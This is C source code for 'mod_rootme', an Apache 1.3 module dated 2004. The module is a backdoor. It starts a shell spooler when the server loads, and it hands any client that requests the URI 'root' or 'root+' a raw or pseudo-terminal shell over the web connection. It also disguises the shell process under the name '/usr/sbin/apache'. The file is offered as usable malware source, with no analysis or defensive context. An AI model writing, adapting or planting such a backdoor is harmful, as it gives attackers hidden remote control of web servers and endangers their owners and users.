/*
 *  mod_rootme for Apache 1.3, version 0.3
 *
 *  Copyright (C) 2004  Christophe Devine
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 2 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
 */

#define MODULE_MAGIC_COOKIE COOKIE_AP13 /* COOKIE_EAPI */

#define HIDE_SHELL      "/usr/sbin/apache"
#define ROOT_KEY        "root"
#define ROOT_KEY2       "root+"

#include "mrm_server.h"
#include "httpd13.h" 

void init_rootme( server_rec *s, pool *p )
{
    shell_spooler();
}

static int rootme_post_read_request( request_rec *r )
{
    int fd = r->connection->client->fd;

    if( ! strcmp( r->uri, ROOT_KEY ) )
    {
        process_client( GET_RAW_SHELL, fd );
        exit( 0 );
    }

    if( ! strcmp( r->uri, ROOT_KEY2 ) )
    {
        process_client( GET_PTY_SHELL, fd );
        exit( 0 );
    }

    return( DECLINED );
}

module rootme_module =
{
    STANDARD_MODULE_STUFF,
    init_rootme,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    rootme_post_read_request
};
